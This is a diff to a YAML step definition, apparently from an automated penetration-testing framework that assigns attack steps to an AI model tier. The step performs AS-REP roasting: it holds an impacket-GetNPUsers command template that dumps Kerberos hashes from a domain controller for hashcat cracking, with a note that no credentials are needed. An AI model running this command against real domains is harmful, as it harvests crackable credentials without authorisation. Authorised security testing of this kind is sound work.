@@ -8,8 +8,8 @@ parameters:
   target_ip: from_engagement.target_ip
   domain: from_engagement.domain
   username: from_cred.username
-command_template: impacket-GetNPUsers '{domain}/' -dc-ip {target_ip} -usersfile /tmp/users.txt
-  -format hashcat -outputfile /tmp/asrep_hashes.txt
+command_template: impacket-GetNPUsers '{domain}/' -dc-ip {target_ip} -usersfile /tmp/users.txt -format hashcat -outputfile
+  /tmp/asrep_hashes.txt
 parser: impacket_parser
 expected_effects:
 - asrep_hashes_obtained
@@ -18,7 +18,10 @@ falsifier:
   pattern: No entries found|KRB_AP_ERR_SKEW|error
   timeout: 45
 model_tier: haiku
-mechanism: Requests AS-REP for accounts with DONT_REQUIRE_PREAUTH set. No credentials
-  needed if you have usernames. Hashes are Kerberos 5 AS-REP (hashcat -m 18200). Rarer
-  than Kerberoasting but requires no creds.
+mechanism: Requests AS-REP for accounts with DONT_REQUIRE_PREAUTH set. No credentials needed if you have usernames. Hashes
+  are Kerberos 5 AS-REP (hashcat -m 18200). Rarer than Kerberoasting but requires no creds.
 hacktricks_ref: windows-hardening/active-directory-methodology/asreproast.md
+references:
+  ocd_mindmap_node_ids:
+  - 47f952c738
+  - d9dae27bbc
